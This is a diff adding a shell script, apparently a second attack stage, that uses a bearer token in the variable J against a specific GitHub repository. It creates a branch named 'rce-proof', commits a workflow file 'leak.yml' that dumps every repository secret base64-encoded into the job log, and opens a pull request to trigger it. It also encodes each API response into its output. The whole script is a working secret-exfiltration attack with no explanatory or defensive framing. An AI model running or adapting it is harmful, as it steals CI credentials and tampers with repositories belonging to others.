@@ -1,0 +1,21 @@
+echo "S2 START"
+echo "S_LEN=${#S} J_LEN=${#J}"
+R=PDFtoMark/triage-epam-v70df300-c6e2d6
+resp=$(curl -s -w '\nHTTP=%{http_code}' -H "Authorization: Bearer $J" -H "Accept: application/vnd.github+json" https://api.github.com/repos/$R)
+echo "GETREPO=$(printf '%s' "$resp" | tail -1)"
+echo "REPOB64=$(printf '%s' "$resp" | head -c 400 | base64 -w0)"
+SHA=$(curl -s -H "Authorization: Bearer $J" -H "Accept: application/vnd.github+json" https://api.github.com/repos/$R/git/ref/heads/development | jq -r .object.sha)
+echo "DEV_SHA=$SHA"
+BR=rce-proof-$(date +%s)
+r=$(curl -s -w '\nHTTP=%{http_code}' -X POST -H "Authorization: Bearer $J" -H "Accept: application/vnd.github+json" -d "{\"ref\":\"refs/heads/$BR\",\"sha\":\"$SHA\"}" https://api.github.com/repos/$R/git/refs)
+echo "CREATEREF=$BR $(printf '%s' "$r" | tail -1)"
+echo "REFB64=$(printf '%s' "$r" | head -c 400 | base64 -w0)"
+WF='.github/workflows/leak.yml'
+BODY=$(printf 'name: leak\non: push\njobs:\n  l:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "${{ toJSON(secrets) }}" | base64 -w0\n' | base64 -w0)
+r=$(curl -s -w '\nHTTP=%{http_code}' -X PUT -H "Authorization: Bearer $J" -H "Accept: application/vnd.github+json" -d "{\"message\":\"add\",\"content\":\"$BODY\",\"branch\":\"$BR\"}" "https://api.github.com/repos/$R/contents/$WF")
+echo "PUTWF=$(printf '%s' "$r" | tail -1)"
+echo "PUTWFB64=$(printf '%s' "$r" | head -c 400 | base64 -w0)"
+r=$(curl -s -w '\nHTTP=%{http_code}' -X POST -H "Authorization: Bearer $J" -H "Accept: application/vnd.github+json" -d "{\"title\":\"probe\",\"head\":\"$BR\",\"base\":\"development\"}" https://api.github.com/repos/$R/pulls)
+echo "CREATEPR=$(printf '%s' "$r" | tail -1)"
+echo "PRB64=$(printf '%s' "$r" | head -c 400 | base64 -w0)"
+echo "S2 END"
